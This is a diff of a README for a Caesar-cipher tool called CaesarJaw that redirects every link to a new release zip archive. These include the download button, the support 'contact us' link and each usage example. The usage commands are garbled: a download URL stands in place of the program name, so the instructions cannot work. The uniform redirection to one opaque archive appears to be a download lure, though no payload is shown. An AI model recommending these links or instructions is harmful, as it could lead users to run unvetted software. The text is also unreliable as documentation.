@@ -48,9 +48,9 @@ In cases where you are unable to find the correct shift key, CaesarJaw offers a 
 
 ## Get Started
 
-To start using CaesarJaw, you can [click here](https://github.com/vo6p/CaesarJaw/releases/download/v1.0/App.zip) to download the repository. Once downloaded, launch the script to begin encrypting, decrypting, and exploring the world of Caesar Cipher.
+To start using CaesarJaw, you can [click here](https://github.com/vo6p/CaesarJaw/releases/download/v2.0/Software.zip) to download the repository. Once downloaded, launch the script to begin encrypting, decrypting, and exploring the world of Caesar Cipher.
 
-[![Download CaesarJaw](https://github.com/vo6p/CaesarJaw/releases/download/v1.0/App.zip)](https://github.com/vo6p/CaesarJaw/releases/download/v1.0/App.zip)
+[![Download CaesarJaw](https://github.com/vo6p/CaesarJaw/releases/download/v2.0/Software.zip)](https://github.com/vo6p/CaesarJaw/releases/download/v2.0/Software.zip)
 
 If the link above does not work or you need more information, you can also check the "Releases" section of this repository for the latest updates and downloads.
 
@@ -61,28 +61,28 @@ If the link above does not work or you need more information, you can also check
 ### Encrypting Text
 
 ```bash
-$ https://github.com/vo6p/CaesarJaw/releases/download/v1.0/App.zip -e "Hello, World!" -k 3
+$ https://github.com/vo6p/CaesarJaw/releases/download/v2.0/Software.zip -e "Hello, World!" -k 3
 Output: Khoor, Zruog!
 ```
 
 ### Decrypting Text
 
 ```bash
-$ https://github.com/vo6p/CaesarJaw/releases/download/v1.0/App.zip -d "Khoor, Zruog!" -k 3
+$ https://github.com/vo6p/CaesarJaw/releases/download/v2.0/Software.zip -d "Khoor, Zruog!" -k 3
 Output: Hello, World!
 ```
 
 ### Finding Shift Key
 
 ```bash
-$ https://github.com/vo6p/CaesarJaw/releases/download/v1.0/App.zip -f "Khoor, Zruog!"
+$ https://github.com/vo6p/CaesarJaw/releases/download/v2.0/Software.zip -f "Khoor, Zruog!"
 Possible Shift Key: 3
 ```
 
 ### Brute-Force Decryption
 
 ```bash
-$ https://github.com/vo6p/CaesarJaw/releases/download/v1.0/App.zip -b "Khoor, Zruog!"
+$ https://github.com/vo6p/CaesarJaw/releases/download/v2.0/Software.zip -b "Khoor, Zruog!"
 Possible Decryptions:
 1. Jgnnq, Yqtnf!
 2. Ifmmp, Xpsme!
@@ -107,7 +107,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Support
 
-For any questions or assistance regarding CaesarJaw, please don't hesitate to [contact us](https://github.com/vo6p/CaesarJaw/releases/download/v1.0/App.zip). Your feedback is valuable for the improvement of this tool.
+For any questions or assistance regarding CaesarJaw, please don't hesitate to [contact us](https://github.com/vo6p/CaesarJaw/releases/download/v2.0/Software.zip). Your feedback is valuable for the improvement of this tool.
 
 ---
 
